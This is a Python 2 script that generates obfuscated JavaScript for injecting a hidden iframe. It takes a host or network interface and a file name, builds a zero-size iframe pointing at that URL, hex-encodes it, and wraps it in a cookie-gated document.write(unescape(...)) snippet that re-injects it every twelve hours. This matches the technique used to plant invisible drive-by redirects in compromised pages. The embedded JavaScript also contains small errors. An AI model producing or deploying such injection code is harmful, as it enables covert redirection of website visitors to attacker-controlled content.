import os, re, sys
import optparse
try:
    from netifaces import interfaces, ifaddresses, AF_INET
except ImportError:
    print 'Except: sudo pip install netifaces\n'
    sys.exit()

class encoder:

    def __init__(self):
        """
        """

    def hex_encoder(self,data):
        data = data.encode("hex")
        reg = re.compile(r'\w{2}')
        data2 = reg.findall(data)
        data3 = '%'+'%'.join(data2)
        return data3

class optParser:

    def __init__(self):
        """
        """
    def inputParser(self, opt_in):
        script = open(opt_in).read()
        return script

    def dataRewritePath(self, opt_path):
        if opt_path:
            if bool(re.search('^/.*$',opt_path)):
                opt_path = opt_path[1:]
            if bool(re.search('^.*/$',opt_path)):
                opt_path = opt_path[:-1]
        return opt_path

    def dataRewriteEth(self, opt_eth):
        if bool(re.search('^((https)\:\/\/)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$',opt_eth)):
            opt_eth = opt_eth[8:]
            print 'do not use https, change to http'
        elif bool(re.search('^((http)\:\/\/)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$',opt_eth)):
            opt_eth = opt_eth[7:]
        return opt_eth

    def dataRewriteName(self, opt_name):
        if bool(re.search('(^\w*\.(htm(l)?))',opt_name)) == False:
           print 'File extension change to htm or html\n'
           sys.exit()
        return opt_name

    def ethParser(self, opt_eth, opt_path, opt_name):
        if opt_eth in interfaces():
            ip_addr = ifaddresses(opt_eth).setdefault(AF_INET, [{'addr':'No IP addr'}])[0]['addr']
            print 'ip: %s' %ip_addr
            print 'interface: %s' %opt_eth
            if opt_path:
                full_path = 'http://%s/%s/%s' %(ip_addr,opt_path,opt_name)
            else:
                full_path = 'http://%s/%s' %(ip_addr,opt_name)
        else:
            print 'domain: %s' %opt_eth
            if opt_path:
                full_path = 'http://%s/%s/%s' %(opt_eth,opt_path,opt_name)
            else:
                full_path = 'http://%s/%s' %(opt_eth,opt_name)
        print 'path: %s' %opt_path
        print 'file: %s' %opt_name
        print 'full path: %s' %full_path
        ori_js = '<iframe src=\''+full_path+'\' width=\'0\' height=\'0\'></iframe>'
        return ori_js

    def obf_js(self, ori_js):
        obf_hex_js = """<script>
if(document.cookie.indexOf('kisec')==-1{
  var expires=new Data();
  expires.setTime(expires.getTime()+12*60*60*1000);
  document.cookie=\'kisec=Yes;path=/;expires=\'+expires.toGMTString();
  document.write(unescape(\"%s\"));
}
</script>"""%(ori_js)
        return obf_hex_js
    def outParser(self, opt_out, opt_print, result):
        if opt_print:
            if opt_out:
                open(opt_out,'w').write(result)
                print 'open \'%s\' file' %(opt_out)
        else:
            if opt_out:
                open(opt_out,'w').write(result)
                print 'open \'%s\' file' %(opt_out)
            else:
                open('out.js','w').write(result)
                print 'open \'out.js\' file'

def run():
    print '\nVersion: 0.1'
    parser =  optparse.OptionParser('\n\thex_encoder.py -i [input file name] -o [output file name]\n' + \
                                    '\thex_encoder.py -e [input network interface or domain] -t ' + \
                                        '[input URI] -n [file name] -o [output file name]\n' + \
                                    '\t(if -o option is null, default use out.js)\n' + \
                                    '\t(if you use -p options, default disuse -o option)\n')

    parser.add_option('-i', '--input', dest='IN', type='string', help='input iframe tag code in HTML')
    parser.add_option('-o', '--output', dest='OUT', type='string', help='output javascript file name')
    parser.add_option('-t', '--path', dest='PATH', type='string', help='input URI path value')
    parser.add_option('-e', '--eth', dest='ETH', type='string', help='input network interface or domain')
    parser.add_option('-n', '--name', dest='NAME', type='string', help='input file name')
    parser.add_option('-p', '--print', dest='PRINT', help='print value and obf-code', default="", action='store_true')
    (options, args) = parser.parse_args()

    try:
        e = encoder()
        opt = optParser()
        opt_in = options.IN
        opt_out = options.OUT
        opt_path = options.PATH
        opt_eth = options.ETH
        opt_name = options.NAME
        opt_print = options.PRINT

        if opt_eth:
            re_opt_path = opt.dataRewritePath(opt_path)
            re_opt_eth = opt.dataRewriteEth(opt_eth)
            re_opt_name = opt.dataRewriteName(opt_name)
            data = opt.ethParser(re_opt_eth, re_opt_path, re_opt_name)
        else:
            data = opt.inputParser(opt_in)
        if data:
            result1 = e.hex_encoder(data)
            result = opt.obf_js(result1)
        else:
            print 'input ip or domain or file\n\n'

        if opt_print:
            print '\nresult:\n%s' %result
        opt.outParser(opt_out, opt_print, result)

    except TypeError as e:
        parser.print_help()
#        print e


if __name__=='__main__':
    run()

